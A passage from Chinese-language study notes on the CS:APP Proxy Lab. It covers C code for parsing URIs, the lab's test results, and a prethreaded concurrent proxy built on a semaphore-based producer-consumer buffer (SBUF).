</span><span id=__span-185-16><a id=__codelineno-185-16 name=__codelineno-185-16></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>portpose</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-185-17><a id=__codelineno-185-17 name=__codelineno-185-17></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-185-18><a id=__codelineno-185-18 name=__codelineno-185-18></a><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>tmp</span><span class=p>;</span>
</span><span id=__span-185-19><a id=__codelineno-185-19 name=__codelineno-185-19></a><span class=w>            </span><span class=n>sscanf</span><span class=p>(</span><span class=n>portpose</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=s>"%d%s"</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>tmp</span><span class=p>,</span><span class=w> </span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>path</span><span class=p>);</span>
</span><span id=__span-185-20><a id=__codelineno-185-20 name=__codelineno-185-20></a><span class=w>            </span><span class=n>sprintf</span><span class=p>(</span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>port</span><span class=p>,</span><span class=w> </span><span class=s>"%d"</span><span class=p>,</span><span class=w> </span><span class=n>tmp</span><span class=p>);</span>
</span><span id=__span-185-21><a id=__codelineno-185-21 name=__codelineno-185-21></a><span class=w>            </span><span class=o>*</span><span class=n>portpose</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>'\0'</span><span class=p>;</span>
</span><span id=__span-185-22><a id=__codelineno-185-22 name=__codelineno-185-22></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-185-23><a id=__codelineno-185-23 name=__codelineno-185-23></a><span class=w>        </span><span class=k>else</span>
</span><span id=__span-185-24><a id=__codelineno-185-24 name=__codelineno-185-24></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-185-25><a id=__codelineno-185-25 name=__codelineno-185-25></a><span class=w>            </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>pathpose</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>strstr</span><span class=p>(</span><span class=n>hostpose</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=s>"/"</span><span class=p>);</span>
</span><span id=__span-185-26><a id=__codelineno-185-26 name=__codelineno-185-26></a><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>pathpose</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-185-27><a id=__codelineno-185-27 name=__codelineno-185-27></a><span class=w>            </span><span class=p>{</span>
</span><span id=__span-185-28><a id=__codelineno-185-28 name=__codelineno-185-28></a><span class=w>                </span><span class=n>strcpy</span><span class=p>(</span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>path</span><span class=p>,</span><span class=w> </span><span class=n>pathpose</span><span class=p>);</span>
</span><span id=__span-185-29><a id=__codelineno-185-29 name=__codelineno-185-29></a><span class=w>                </span><span class=n>strcpy</span><span class=p>(</span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>port</span><span class=p>,</span><span class=w> </span><span class=s>"80"</span><span class=p>);</span>
</span><span id=__span-185-30><a id=__codelineno-185-30 name=__codelineno-185-30></a><span class=w>                </span><span class=o>*</span><span class=n>pathpose</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>'\0'</span><span class=p>;</span>
</span><span id=__span-185-31><a id=__codelineno-185-31 name=__codelineno-185-31></a><span class=w>            </span><span class=p>}</span>
</span><span id=__span-185-32><a id=__codelineno-185-32 name=__codelineno-185-32></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-185-33><a id=__codelineno-185-33 name=__codelineno-185-33></a><span class=w>        </span><span class=n>strcpy</span><span class=p>(</span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>host</span><span class=p>,</span><span class=w> </span><span class=n>hostpose</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>2</span><span class=p>);</span>
</span><span id=__span-185-34><a id=__codelineno-185-34 name=__codelineno-185-34></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-185-35><a id=__codelineno-185-35 name=__codelineno-185-35></a><span class=w>    </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-185-36><a id=__codelineno-185-36 name=__codelineno-185-36></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <h4 id=_34>测试与结果<a class=headerlink href=#_34 title="Permanent link">¶</a></h4> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-186-1>1</a></span>
<span class=normal><a href=#__codelineno-186-2>2</a></span>
<span class=normal><a href=#__codelineno-186-3>3</a></span>
<span class=normal><a href=#__codelineno-186-4>4</a></span>
<span class=normal><a href=#__codelineno-186-5>5</a></span>
<span class=normal><a href=#__codelineno-186-6>6</a></span>
<span class=normal><a href=#__codelineno-186-7>7</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-186-1><a id=__codelineno-186-1 name=__codelineno-186-1></a><span class=m>09</span>-Proxy-Lab$<span class=w> </span>sudo<span class=w> </span>apt<span class=w> </span>install<span class=w> </span>net-tools
</span><span id=__span-186-2><a id=__codelineno-186-2 name=__codelineno-186-2></a><span class=m>09</span>-Proxy-Lab$<span class=w> </span>make<span class=w> </span>clean<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./driver.sh
</span><span id=__span-186-3><a id=__codelineno-186-3 name=__codelineno-186-3></a>***<span class=w> </span>Basic<span class=w> </span>***
</span><span id=__span-186-4><a id=__codelineno-186-4 name=__codelineno-186-4></a>...
</span><span id=__span-186-5><a id=__codelineno-186-5 name=__codelineno-186-5></a>Success:<span class=w> </span>Files<span class=w> </span>are<span class=w> </span>identical.
</span><span id=__span-186-6><a id=__codelineno-186-6 name=__codelineno-186-6></a>Killing<span class=w> </span>tiny<span class=w> </span>and<span class=w> </span>proxy
</span><span id=__span-186-7><a id=__codelineno-186-7 name=__codelineno-186-7></a>basicScore:<span class=w> </span><span class=m>40</span>/40
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=part-2-dealing-with-multiple-concurrent-requests>Part 2: Dealing with multiple concurrent requests<a class=headerlink href=#part-2-dealing-with-multiple-concurrent-requests title="Permanent link">¶</a></h3> <p>设计多线程并发处理客户端请求，这里采用预线程化的技术，如图：</p> <p><img alt="alt text" src=../../img/image-115.png></p> <p>这是一个生产者-消费者模型，我们回顾一下：</p> <h4 id=->生产者-消费者模型<a class=headerlink href=#- title="Permanent link">¶</a></h4> <p>生产者和消费者线程共享一个有 n 个槽的优先缓冲区，生产者反复地生成新的项目，并把它们插入到缓冲区中。消费者线程不断从缓冲区中取出，这些项目然后使用它们。因为插入和取出项目都涉及更新共享变量，所以我们必须保证对缓冲区地访问是互斥的，并调度对缓冲区地访问：</p> <ul> <li>如果没有槽位：生产者必须等待</li> <li>如果没有项目：消费者必须等待</li> </ul> <p>在预线程化的服务器中，客户端就是生产者，不断产生连接；Proxy 就是消费者，不断选中客户端连接。为此，开发一个 SBUF 包来实现这个缓冲区地调度。缓冲区设计：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-187-1>1</a></span>
<span class=normal><a href=#__codelineno-187-2>2</a></span>
<span class=normal><a href=#__codelineno-187-3>3</a></span>
<span class=normal><a href=#__codelineno-187-4>4</a></span>
<span class=normal><a href=#__codelineno-187-5>5</a></span>
<span class=normal><a href=#__codelineno-187-6>6</a></span>
<span class=normal><a href=#__codelineno-187-7>7</a></span>
<span class=normal><a href=#__codelineno-187-8>8</a></span>
<span class=normal><a href=#__codelineno-187-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-187-1><a id=__codelineno-187-1 name=__codelineno-187-1></a><span class=k>typedef</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-187-2><a id=__codelineno-187-2 name=__codelineno-187-2></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=o>*</span><span class=n>buf</span><span class=p>;</span><span class=w>          </span><span class=cm>/* Buffer array */</span><span class=w>         </span>
</span><span id=__span-187-3><a id=__codelineno-187-3 name=__codelineno-187-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>n</span><span class=p>;</span><span class=w>             </span><span class=cm>/* Maximum number of slots */</span>
</span><span id=__span-187-4><a id=__codelineno-187-4 name=__codelineno-187-4></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>front</span><span class=p>;</span><span class=w>         </span><span class=cm>/* buf[(front+1)%n] is first item */</span>
</span><span id=__span-187-5><a id=__codelineno-187-5 name=__codelineno-187-5></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>rear</span><span class=p>;</span><span class=w>          </span><span class=cm>/* buf[rear%n] is last item */</span>
</span><span id=__span-187-6><a id=__codelineno-187-6 name=__codelineno-187-6></a><span class=w>    </span><span class=n>sem_t</span><span class=w> </span><span class=n>mutex</span><span class=p>;</span><span class=w>       </span><span class=cm>/* Protects accesses to buf */</span>
</span><span id=__span-187-7><a id=__codelineno-187-7 name=__codelineno-187-7></a><span class=w>    </span><span class=n>sem_t</span><span class=w> </span><span class=n>slots</span><span class=p>;</span><span class=w>       </span><span class=cm>/* Counts available slots */</span>
</span><span id=__span-187-8><a id=__codelineno-187-8 name=__codelineno-187-8></a><span class=w>    </span><span class=n>sem_t</span><span class=w> </span><span class=n>items</span><span class=p>;</span><span class=w>       </span><span class=cm>/* Counts available items */</span>
</span><span id=__span-187-9><a id=__codelineno-187-9 name=__codelineno-187-9></a><span class=p>}</span><span class=w> </span><span class=n>sbuf_t</span><span class=p>;</span>
</span></code></pre></div></td></tr></table></div> <p>其中有 3 个信号量:</p> <ul> <li>mutex 初始化为 1，保证对缓冲区的访问是互斥的</li> <li>slots 初始化为 n，记录槽位</li> <li>items 初始化为 0，记录项目数</li> </ul> <p>由此，设计客户端向缓冲区插入函数：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-188-1>1</a></span>
<span class=normal><a href=#__codelineno-188-2>2</a></span>
<span class=normal><a href=#__codelineno-188-3>3</a></span>
<span class=normal><a href=#__codelineno-188-4>4</a></span>
<span class=normal><a href=#__codelineno-188-5>5</a></span>
<span class=normal><a href=#__codelineno-188-6>6</a></span>
<span class=normal><a href=#__codelineno-188-7>7</a></span>
<span class=normal><a href=#__codelineno-188-8>8</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-188-1><a id=__codelineno-188-1 name=__codelineno-188-1></a><span class=kt>void</span><span class=w> </span><span class=nf>sbuf_insert</span><span class=p>(</span><span class=n>sbuf_t</span><span class=w> </span><span class=o>*</span><span class=n>sp</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>item</span><span class=p>)</span>
</span><span id=__span-188-2><a id=__codelineno-188-2 name=__codelineno-188-2></a><span class=p>{</span>
</span><span id=__span-188-3><a id=__codelineno-188-3 name=__codelineno-188-3></a><span class=w>    </span><span class=n>P</span><span class=p>(</span><span class=o>&amp;</span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>slots</span><span class=p>);</span><span class=w>                          </span><span class=cm>/* Wait for available slot */</span>
</span><span id=__span-188-4><a id=__codelineno-188-4 name=__codelineno-188-4></a><span class=w>    </span><span class=n>P</span><span class=p>(</span><span class=o>&amp;</span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>mutex</span><span class=p>);</span><span class=w>                          </span><span class=cm>/* Lock the buffer */</span>
</span><span id=__span-188-5><a id=__codelineno-188-5 name=__codelineno-188-5></a><span class=w>    </span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>buf</span><span class=p>[(</span><span class=o>++</span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>rear</span><span class=p>)</span><span class=o>%</span><span class=p>(</span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>n</span><span class=p>)]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>item</span><span class=p>;</span><span class=w>   </span><span class=cm>/* Insert the item */</span>
</span><span id=__span-188-6><a id=__codelineno-188-6 name=__codelineno-188-6></a><span class=w>    </span><span class=n>V</span><span class=p>(</span><span class=o>&amp;</span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>mutex</span><span class=p>);</span><span class=w>                          </span><span class=cm>/* Unlock the buffer */</span>
</span><span id=__span-188-7><a id=__codelineno-188-7 name=__codelineno-188-7></a><span class=w>    </span><span class=n>V</span><span class=p>(</span><span class=o>&amp;</span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>items</span><span class=p>);</span><span class=w>                          </span><span class=cm>/* Announce available item */</span>
</span><span id=__span-188-8><a id=__codelineno-188-8 name=__codelineno-188-8></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <ul> <li>首先有一个对 slots 的 P 操作，保证了如果槽位已满，则客户端被挂起，不会继续往缓冲区写入请求</li> <li>然后是一个 mutex 的 P 操作，保证了对缓冲区互斥的访问</li> <li>缓冲区插入完成后，释放所有的锁</li> </ul> <p>设计 Proxy 从缓冲区读入的函数：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-189-1> 1</a></span>
<span class=normal><a href=#__codelineno-189-2> 2</a></span>
<span class=normal><a href=#__codelineno-189-3> 3</a></span>
<span class=normal><a href=#__codelineno-189-4> 4</a></span>
<span class=normal><a href=#__codelineno-189-5> 5</a></span>
<span class=normal><a href=#__codelineno-189-6> 6</a></span>
<span class=normal><a href=#__codelineno-189-7> 7</a></span>
<span class=normal><a href=#__codelineno-189-8> 8</a></span>
<span class=normal><a href=#__codelineno-189-9> 9</a></span>
<span class=normal><a href=#__codelineno-189-10>10</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-189-1><a id=__codelineno-189-1 name=__codelineno-189-1></a><span class=kt>int</span><span class=w> </span><span class=nf>sbuf_remove</span><span class=p>(</span><span class=n>sbuf_t</span><span class=w> </span><span class=o>*</span><span class=n>sp</span><span class=p>)</span>
</span><span id=__span-189-2><a id=__codelineno-189-2 name=__codelineno-189-2></a><span class=p>{</span>
</span><span id=__span-189-3><a id=__codelineno-189-3 name=__codelineno-189-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>item</span><span class=p>;</span>
</span><span id=__span-189-4><a id=__codelineno-189-4 name=__codelineno-189-4></a><span class=w>    </span><span class=n>P</span><span class=p>(</span><span class=o>&amp;</span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>items</span><span class=p>);</span><span class=w>                          </span><span class=cm>/* Wait for available item */</span>
</span><span id=__span-189-5><a id=__codelineno-189-5 name=__codelineno-189-5></a><span class=w>    </span><span class=n>P</span><span class=p>(</span><span class=o>&amp;</span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>mutex</span><span class=p>);</span><span class=w>                          </span><span class=cm>/* Lock the buffer */</span>
</span><span id=__span-189-6><a id=__codelineno-189-6 name=__codelineno-189-6></a><span class=w>    </span><span class=n>item</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>buf</span><span class=p>[(</span><span class=o>++</span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>front</span><span class=p>)</span><span class=o>%</span><span class=p>(</span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>n</span><span class=p>)];</span><span class=w>  </span><span class=cm>/* Remove the item */</span>
</span><span id=__span-189-7><a id=__codelineno-189-7 name=__codelineno-189-7></a><span class=w>    </span><span class=n>V</span><span class=p>(</span><span class=o>&amp;</span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>mutex</span><span class=p>);</span><span class=w>                          </span><span class=cm>/* Unlock the buffer */</span>
</span><span id=__span-189-8><a id=__codelineno-189-8 name=__codelineno-189-8></a><span class=w>    </span><span class=n>V</span><span class=p>(</span><span class=o>&amp;</span><span class=n>sp</span><span class=o>-&gt;</span><span class=n>slots</span><span class=p>);</span><span class=w>                          </span><span class=cm>/* Announce available slot */</span>
</span><span id=__span-189-9><a id=__codelineno-189-9 name=__codelineno-189-9></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>item</span><span class=p>;</span>
</span><span id=__span-189-10><a id=__codelineno-189-10 name=__codelineno-189-10></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <ul> <li>首先有一个对 items 的 P 操作，保证了如果没有项目，则 Proxy 被挂起，不会继续往缓冲区读出客户端</li> <li>然后是一个 mutex 的 P 操作，保证了对缓冲区互斥的访问</li> <li>缓冲区读出完成后，释放所有的锁，返回其中一个客户端的描述符</li> </ul> <h4 id=proxy>基于预线程化的 Proxy<a class=headerlink href=#proxy title="Permanent link">¶</a></h4> <p>大部分代码与第 1 部分一样:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-190-1> 1</a></span>
<span class=normal><a href=#__codelineno-190-2> 2</a></span>
<span class=normal><a href=#__codelineno-190-3> 3</a></span>
<span class=normal><a href=#__codelineno-190-4> 4</a></span>
<span class=normal><a href=#__codelineno-190-5> 5</a></span>
<span class=normal><a href=#__codelineno-190-6> 6</a></span>
<span class=normal><a href=#__codelineno-190-7> 7</a></span>
<span class=normal><a href=#__codelineno-190-8> 8</a></span>
<span class=normal><a href=#__codelineno-190-9> 9</a></span>
<span class=normal><a href=#__codelineno-190-10>10</a></span>
<span class=normal><a href=#__codelineno-190-11>11</a></span>
<span class=normal><a href=#__codelineno-190-12>12</a></span>
<span class=normal><a href=#__codelineno-190-13>13</a></span>
<span class=normal><a href=#__codelineno-190-14>14</a></span>
<span class=normal><a href=#__codelineno-190-15>15</a></span>
<span class=normal><a href=#__codelineno-190-16>16</a></span>
<span class=normal><a href=#__codelineno-190-17>17</a></span>
<span class=normal><a href=#__codelineno-190-18>18</a></span>
<span class=normal><a href=#__codelineno-190-19>19</a></span>
<span class=normal><a href=#__codelineno-190-20>20</a></span>
<span class=normal><a href=#__codelineno-190-21>21</a></span>
<span class=normal><a href=#__codelineno-190-22>22</a></span>
<span class=normal><a href=#__codelineno-190-23>23</a></span>
<span class=normal><a href=#__codelineno-190-24>24</a></span>
<span class=normal><a href=#__codelineno-190-25>25</a></span>
<span class=normal><a href=#__codelineno-190-26>26</a></span>
<span class=normal><a href=#__codelineno-190-27>27</a></span>
<span class=normal><a href=#__codelineno-190-28>28</a></span>
<span class=normal><a href=#__codelineno-190-29>29</a></span>
<span class=normal><a href=#__codelineno-190-30>30</a></span>
<span class=normal><a href=#__codelineno-190-31>31</a></span>
<span class=normal><a href=#__codelineno-190-32>32</a></span>
<span class=normal><a href=#__codelineno-190-33>33</a></span>
<span class=normal><a href=#__codelineno-190-34>34</a></span>
<span class=normal><a href=#__codelineno-190-35>35</a></span>
<span class=normal><a href=#__codelineno-190-36>36</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-190-1><a id=__codelineno-190-1 name=__codelineno-190-1></a><span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>)</span>
</span><span id=__span-190-2><a id=__codelineno-190-2 name=__codelineno-190-2></a><span class=p>{</span>
</span><span id=__span-190-3><a id=__codelineno-190-3 name=__codelineno-190-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>listenfd</span><span class=p>,</span><span class=w> </span><span class=n>connfd</span><span class=p>;</span>
</span><span id=__span-190-4><a id=__codelineno-190-4 name=__codelineno-190-4></a><span class=w>    </span><span class=kt>socklen_t</span><span class=w> </span><span class=n>clientlen</span><span class=p>;</span>
</span><span id=__span-190-5><a id=__codelineno-190-5 name=__codelineno-190-5></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>hostname</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>port</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span>
</span><span id=__span-190-6><a id=__codelineno-190-6 name=__codelineno-190-6></a>
</span><span id=__span-190-7><a id=__codelineno-190-7 name=__codelineno-190-7></a><span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>sockaddr_storage</span><span class=w> </span><span class=n>clientaddr</span><span class=p>;</span>
</span><span id=__span-190-8><a id=__codelineno-190-8 name=__codelineno-190-8></a>
</span><span id=__span-190-9><a id=__codelineno-190-9 name=__codelineno-190-9></a><span class=w>    </span><span class=n>pthread_t</span><span class=w> </span><span class=n>tid</span><span class=p>;</span>
</span><span id=__span-190-10><a id=__codelineno-190-10 name=__codelineno-190-10></a>
</span><span id=__span-190-11><a id=__codelineno-190-11 name=__codelineno-190-11></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>argc</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=mi>2</span><span class=p>)</span>
</span><span id=__span-190-12><a id=__codelineno-190-12 name=__codelineno-190-12></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-190-13><a id=__codelineno-190-13 name=__codelineno-190-13></a><span class=w>        </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>"usage :%s &lt;port&gt; </span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span><span id=__span-190-14><a id=__codelineno-190-14 name=__codelineno-190-14></a><span class=w>        </span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span><span id=__span-190-15><a id=__codelineno-190-15 name=__codelineno-190-15></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-190-16><a id=__codelineno-190-16 name=__codelineno-190-16></a><span class=w>    </span><span class=n>signal</span><span class=p>(</span><span class=n>SIGPIPE</span><span class=p>,</span><span class=w> </span><span class=n>sigpipe_handler</span><span class=p>);</span>
</span><span id=__span-190-17><a id=__codelineno-190-17 name=__codelineno-190-17></a><span class=w>    </span><span class=n>listenfd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Open_listenfd</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span><span id=__span-190-18><a id=__codelineno-190-18 name=__codelineno-190-18></a>
</span><span id=__span-190-19><a id=__codelineno-190-19 name=__codelineno-190-19></a><span class=w>    </span><span class=n>sbuf_init</span><span class=p>(</span><span class=o>&amp;</span><span class=n>sbuf</span><span class=p>,</span><span class=w> </span><span class=n>SBUFSIZE</span><span class=p>);</span>
</span><span id=__span-190-20><a id=__codelineno-190-20 name=__codelineno-190-20></a><span class=w>    </span><span class=c1>//创建工作者线程</span>
</span><span id=__span-190-21><a id=__codelineno-190-21 name=__codelineno-190-21></a><span class=w>    </span><span class=k>for</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>NTHREADS</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-190-22><a id=__codelineno-190-22 name=__codelineno-190-22></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-190-23><a id=__codelineno-190-23 name=__codelineno-190-23></a><span class=w>        </span><span class=n>Pthread_create</span><span class=p>(</span><span class=o>&amp;</span><span class=n>tid</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>,</span><span class=w> </span><span class=kr>thread</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span>
</span><span id=__span-190-24><a id=__codelineno-190-24 name=__codelineno-190-24></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-190-25><a id=__codelineno-190-25 name=__codelineno-190-25></a>
</span><span id=__span-190-26><a id=__codelineno-190-26 name=__codelineno-190-26></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span><span id=__span-190-27><a id=__codelineno-190-27 name=__codelineno-190-27></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-190-28><a id=__codelineno-190-28 name=__codelineno-190-28></a><span class=w>        </span><span class=n>clientlen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>clientaddr</span><span class=p>);</span>
</span><span id=__span-190-29><a id=__codelineno-190-29 name=__codelineno-190-29></a><span class=w>        </span><span class=n>connfd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Accept</span><span class=p>(</span><span class=n>listenfd</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=n>SA</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>clientaddr</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>clientlen</span><span class=p>);</span>
</span><span id=__span-190-30><a id=__codelineno-190-30 name=__codelineno-190-30></a><span class=w>        </span><span class=c1>//向缓冲区写入这个描述符</span>
</span><span id=__span-190-31><a id=__codelineno-190-31 name=__codelineno-190-31></a><span class=w>        </span><span class=n>sbuf_insert</span><span class=p>(</span><span class=o>&amp;</span><span class=n>sbuf</span><span class=p>,</span><span class=w> </span><span class=n>connfd</span><span class=p>);</span>
</span><span id=__span-190-32><a id=__codelineno-190-32 name=__codelineno-190-32></a><span class=w>        </span><span class=n>Getnameinfo</span><span class=p>((</span><span class=n>SA</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>clientaddr</span><span class=p>,</span><span class=w> </span><span class=n>clientlen</span><span class=p>,</span><span class=w> </span><span class=n>hostname</span><span class=p>,</span><span class=w> </span><span class=n>MAXLINE</span><span class=p>,</span><span class=w> </span><span class=n>port</span><span class=p>,</span><span class=w> </span><span class=n>MAXLINE</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span>
</span><span id=__span-190-33><a id=__codelineno-190-33 name=__codelineno-190-33></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"Accepted connection from (%s %s).</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>hostname</span><span class=p>,</span><span class=w> </span><span class=n>port</span><span class=p>);</span>
</span><span id=__span-190-34><a id=__codelineno-190-34 name=__codelineno-190-34></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-190-35><a id=__codelineno-190-35 name=__codelineno-190-35></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-190-36><a id=__codelineno-190-36 name=__codelineno-190-36></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>然后是线程执行函数：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-191-1> 1</a></span>
<span class=normal><a href=#__codelineno-191-2> 2</a></span>
<span class=normal><a href=#__codelineno-191-3> 3</a></span>
<span class=normal><a href=#__codelineno-191-4> 4</a></span>
<span class=normal><a href=#__codelineno-191-5> 5</a></span>
<span class=normal><a href=#__codelineno-191-6> 6</a></span>
<span class=normal><a href=#__codelineno-191-7> 7</a></span>
<span class=normal><a href=#__codelineno-191-8> 8</a></span>
<span class=normal><a href=#__codelineno-191-9> 9</a></span>
<span class=normal><a href=#__codelineno-191-10>10</a></span>
<span class=normal><a href=#__codelineno-191-11>11</a></span>
<span class=normal><a href=#__codelineno-191-12>12</a></span>
<span class=normal><a href=#__codelineno-191-13>13</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-191-1><a id=__codelineno-191-1 name=__codelineno-191-1></a><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=nf>thread</span><span class=p>(</span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>vargp</span><span class=p>)</span>
</span><span id=__span-191-2><a id=__codelineno-191-2 name=__codelineno-191-2></a><span class=p>{</span>
</span><span id=__span-191-3><a id=__codelineno-191-3 name=__codelineno-191-3></a><span class=w>    </span><span class=n>Pthread_detach</span><span class=p>(</span><span class=n>pthread_self</span><span class=p>());</span>
</span><span id=__span-191-4><a id=__codelineno-191-4 name=__codelineno-191-4></a><span class=w>    </span><span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span><span id=__span-191-5><a id=__codelineno-191-5 name=__codelineno-191-5></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-191-6><a id=__codelineno-191-6 name=__codelineno-191-6></a><span class=w>        </span><span class=c1>// 从缓冲区中读出描述符</span>
</span><span id=__span-191-7><a id=__codelineno-191-7 name=__codelineno-191-7></a><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>connfd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>sbuf_remove</span><span class=p>(</span><span class=o>&amp;</span><span class=n>sbuf</span><span class=p>);</span>
</span><span id=__span-191-8><a id=__codelineno-191-8 name=__codelineno-191-8></a><span class=w>        </span><span class=c1>// 转发</span>
